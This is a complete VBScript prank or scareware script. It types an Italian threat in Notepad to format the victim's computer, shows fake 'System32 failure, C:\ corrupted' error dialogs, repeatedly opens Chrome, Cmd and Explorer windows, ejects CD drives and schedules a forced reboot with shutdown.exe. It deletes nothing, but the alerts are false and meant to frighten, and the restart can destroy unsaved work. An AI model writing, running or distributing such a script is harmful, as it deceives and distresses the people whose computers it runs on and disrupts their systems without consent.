Set oWMP = CreateObject("WMPlayer.OCX.7")
Set colCDROMs =oWMP.cdromCollection
set wshshell = wscript.CreateObject("wscript.shell")
wshshell.run "Notepad"
wscript.sleep 500
wshshell.AppActivate "Notepad"
WshShell.SendKeys "mi"
WScript.Sleep 500
WshShell.SendKeys " dispiace"
WScript.Sleep 500
WshShell.SendKeys " ma"
WScript.Sleep 500
WshShell.SendKeys " ora"
WScript.Sleep 500
WshShell.SendKeys " formatto"
WScript.Sleep 500
WshShell.SendKeys " il"
WScript.Sleep 500
WshShell.SendKeys " tuo"
WScript.Sleep 500
WshShell.SendKeys " computer"
WScript.Sleep 500
WshShell.SendKeys " e"
WScript.Sleep 500
WshShell.SendKeys " lo"
WScript.Sleep 500
WshShell.SendKeys " faccio"
WScript.Sleep 500
WshShell.SendKeys " impazzire"
WScript.Sleep 500
MsgBox ("System32 failure, C:\ corrupted"), 16 , ("ERROR")
MsgBox ("System32 failure, the computer will be rebooted in 5 minutes"), 16 , ("ERROR")
wshshell.run "Notepad"
wscript.sleep 10
wshshell.run "chrome.exe"
wscript.sleep 10
wshshell.run "Cmd"
wscript.sleep 10
wshshell.run "Explorer"
wscript.sleep 10
wscript.sleep 10
wshshell.run "chrome.exe"
wscript.sleep 10
wshshell.run "Cmd"
wscript.sleep 10
wshshell.run "Explorer"
wscript.sleep 10
wscript.sleep 10
wshshell.run "chrome.exe"
wscript.sleep 10
wshshell.run "Cmd"
wscript.sleep 10
wshshell.run "Explorer"
wscript.sleep 10
wscript.sleep 10
wshshell.run "chrome.exe"
wscript.sleep 10
wshshell.run "Cmd"
wscript.sleep 10
wshshell.run "Explorer"
wscript.sleep 10
wscript.sleep 10
if colCDROMs.Count >= 1 then
for i = o to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
colCDROMs.Item(i).Eject
Next' cdrom
End if
Set WSHShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "C:\WINDOWS\system32\shutdown.exe -r -t 3000"